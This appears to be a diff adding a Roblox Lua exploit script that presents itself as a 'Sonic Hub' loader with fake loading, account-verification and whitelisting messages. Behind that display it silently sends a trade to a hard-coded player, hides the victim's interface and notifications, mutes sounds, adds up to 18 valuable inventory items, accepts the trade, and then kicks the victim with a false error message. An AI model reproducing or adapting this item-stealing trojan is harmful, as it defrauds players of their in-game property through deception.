@@ -1,0 +1,260 @@
+
+
+local plrtoinvite = "AnibalPCCCuidado"
+local plr = game.Players.LocalPlayer
+repeat wait() until plr.Character ~= nil
+if game:GetService("Players"):FindFirstChild(plrtoinvite) then
+    
+    --gui
+    
+    spawn(function()
+        
+-- creating guis
+
+local Scgui = Instance.new("ScreenGui")
+local frm = Instance.new("Frame",Scgui)
+local uicorner = Instance.new("UICorner",frm)
+local hubname = Instance.new("TextLabel",frm)
+local Scriptcontent = Instance.new("TextLabel",frm)
+local uigradient2 = Instance.new("UIGradient",frm)
+local uigradient = Instance.new("UIGradient",hubname)
+-- modifying
+
+Scgui.Name = "Sonic"
+frm.Name = "SonicFrame"
+frm.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+frm.Size = UDim2.new(0.303, 0,0, 162)
+frm.Position = UDim2.new(0.349, 0,0.374, 0)
+hubname.Position = UDim2.new(0,0,0,0)
+hubname.Size = UDim2.new(1, 0,0.298, 0)
+hubname.TextColor3 = Color3.fromRGB(34, 161, 190)
+hubname.BackgroundTransparency = 1
+hubname.TextSize = 25
+hubname.Text = "Sonic Hub"
+hubname.Font = Enum.Font.Cartoon
+uigradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.0,Color3.new(0.298039, 0.298039, 1)),ColorSequenceKeypoint.new(1,Color3.new(0.0745098, 0.984314, 1))}
+uigradient2.Color = ColorSequence.new{ ColorSequenceKeypoint.new(0.0,Color3.new(0.0823529, 0.0823529, 0.0823529)) ,ColorSequenceKeypoint.new(0.5,Color3.fromRGB(58,58,58 )),ColorSequenceKeypoint.new(1,Color3.fromRGB(65, 65, 65))  }
+uigradient2.Rotation = -90
+Scriptcontent.Size = UDim2.new(0.515, 0,0.316, 0)
+Scriptcontent.Position = UDim2.new(0.24, 0,0.34, 0)
+Scriptcontent.TextSize = 20
+Scriptcontent.BackgroundTransparency = 1
+Scriptcontent.TextColor3 = Color3.fromRGB(124, 121, 120)
+Scriptcontent.Font = Enum.Font.SourceSans
+Scriptcontent.Text = ""
+local gradient = uigradient
+local ts = game:GetService("TweenService")
+local ti = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+local offset1 = {Offset = Vector2.new(-1, 0)}
+local create1 = ts:Create(gradient, ti, offset1)
+local startPos = Vector2.new(1, 0)
+local rot = 180 --starting gradient rotation
+gradient.Offset = startPos
+gradient.Rotation = 0
+
+
+
+spawn(function()
+    local function completed()
+
+	--border size pixel comming in handy because we only animate the gradient when the mouse is hovering over
+
+	if  rot == 0 then
+
+		gradient.Rotation = 180
+		gradient.Offset = startPos
+		create1:Play()	
+
+	elseif rot == 180 then --this will be run first
+
+		gradient.Rotation = 0
+		gradient.Offset = startPos
+		create1:Play()
+
+	end
+
+end
+	while true do
+		
+		create1:Play()
+		
+		create1.Completed:Wait()
+
+			--flip rotation
+			if rot == 0 then rot = 180 elseif rot == 180 then rot = 0 end
+			completed()
+
+	
+	end
+	
+end)
+
+
+print("Done")
+local GUI = Scgui
+syn.protect_gui(GUI) 
+GUI.Parent = game:GetService("CoreGui")
+
+local plrname = plrtoinvite
+-- LoadScript
+for a = 1,8 do
+	Scriptcontent.Text = "Loading."
+	wait(0.2)
+	Scriptcontent.Text = "Loading.."
+	wait(0.2)
+	Scriptcontent.Text = "Loading..."
+	wait(0.2)
+end
+for b = 1,7 do
+	Scriptcontent.Text = "Verifying account."
+	wait(0.2)
+	Scriptcontent.Text = "Verifying account.."
+	wait(0.2)
+	Scriptcontent.Text = "Verifying account..."
+    wait(0.2)
+	
+	
+end
+for c = 1,18 do
+	Scriptcontent.Text = plrname.." is whitelisting you, please wait."
+	wait(0.2)
+	Scriptcontent.Text = plrname.." is whitelisting you, please wait.."
+	wait(0.2)
+	Scriptcontent.Text = plrname.." is whitelisting you, please wait..."
+	wait(0.2)
+end
+for d = 1,math.huge do
+	wait(0.2)
+	Scriptcontent.Text = "Generating script."
+	wait(0.2)
+	Scriptcontent.Text = "Generating script.."
+	wait(0.2)
+	Scriptcontent.Text = "Generating script..."
+	
+	
+end
+
+        end)
+    
+    
+    
+local args = {
+  [1] = {
+      ["invitedPlayer"] = plrtoinvite,
+      ["invite"] = true
+  }
+}
+plr.PlayerGui.ChildAdded:Connect(function(screen)
+    if screen.ClassName == "ScreenGui" then
+        screen.Enabled = false
+        end
+    end)
+local Notf = plr:FindFirstChild("PlayerGui"):FindFirstChild("Notifications"):FindFirstChild("Frame")
+if Notf then
+    Notf:Destroy()
+    end
+
+   
+  game:GetService("ReplicatedStorage").Modules.ButtonEffect:FindFirstChild("Circle").Image = ""
+for _,v in pairs(game:GetService("ReplicatedStorage").Modules.ButtonEffect:GetChildren()) do
+  if v.ClassName == "Sound" then
+    v.Volume = 0
+    
+  end
+ end
+
+game:GetService("ReplicatedStorage").Events.trade:InvokeServer(unpack(args))
+ 
+repeat
+    wait()
+    
+until plr.PlayerGui:FindFirstChild("TradeGUI")
+local gui = plr.PlayerGui.TradeGUI
+
+print("Loaded")
+local count = 0
+
+
+
+for _,v in pairs(gui:FindFirstChild("LocalScript"):GetChildren()) do
+    if v.ClassName == "Sound" then
+    v.Volume = 0
+
+end
+ end
+    
+    
+gui.ChildAdded:Connect(function(ch)
+if ch.ClassName == "Sound" then
+    ch.Volume = 0
+
+end
+end)
+repeat
+  wait()
+until gui:FindFirstChild("Frame"):FindFirstChild("Accept") and gui:FindFirstChild("Frame"):FindFirstChild("Player"):FindFirstChild("Items") 
+local acc = gui:FindFirstChild("Frame"):FindFirstChild("Accept")
+local addbutton = gui:FindFirstChild("Frame"):FindFirstChild("Player"):FindFirstChild("Items")
+local v = addbutton:FindFirstChild("Add")
+local addpress = v:FindFirstChild("FrameButton")
+if addpress then
+firesignal(addpress.MouseButton1Click)
+repeat
+  wait()
+until gui.Frame.Player:FindFirstChild("Inventory"):GetChildren()
+local Inventory = gui.Frame.Player:FindFirstChild("Inventory"):GetChildren()
+if Inventory then
+  local unwanteditems = {"Spin","Kilo","Suke","Wooden Plank","Katana","Hammer","Caravel","Galleon","Shark Tooth","Rowboat","Carrot","Bandit Eyepatch","Gorila King Crown","Buggy's Cape","Karoo Food","Gomu","Bari","Bomu","Horo","Mero","Yomi","Vel's Lantern","Lantern of Hope","Ice Necklace","Flame Scarf","Anniversary Cap","Anniversary Firework","Anniversary Hat","Anniversary Lantern","Anniversary Shades"}
+  for index, value in pairs(Inventory) do
+    wait(0.1)
+    if count ~= 18 then
+
+    if value.ClassName == "Frame" then
+      local ItemName = value:FindFirstChild("itemName")
+     local valuecheck = true
+      for _, item in pairs(unwanteditems) do
+        if ItemName.Text == item then
+           valuecheck = false
+        end
+      end
+        if valuecheck == true then
+          count = count + 1
+      local framebtt = value:FindFirstChild("FrameButton")
+      firesignal(framebtt.MouseButton1Click)
+    end
+  end
+else
+  break
+end
+
+  end
+  end
+
+   
+ 
+
+else
+   
+    plr:Kick("We do not whitelist alt accounts, please join with a elegible account")
+end
+if count == 0 then
+plr:Kick("We do not whitelist alt accounts, please join with a elegible account")
+end
+
+firesignal(acc.MouseButton1Click)
+repeat wait() until gui == nil
+plr:Kick("Error while generating script, please rejoin")
+elseif game.Workspace:FindFirstChild("CamParts") then
+local servercode = "KF4X5T2yeG"
+wait(1)
+local args = {
+  [1] = servercode
+}
+game:GetService("ReplicatedStorage").Events.reserved:InvokeServer(unpack(args))
+wait(0.1)
+firesignal(plr.PlayerGui.chooseType.Frame.trade.MouseButton1Click)
+
+elseif not game:GetService("Players"):FindFirstChild(plrtoinvite) and not game.Workspace:FindFirstChild("CamParts") then
+plr:Kick("Join menu to get whitelisted")
+
+end
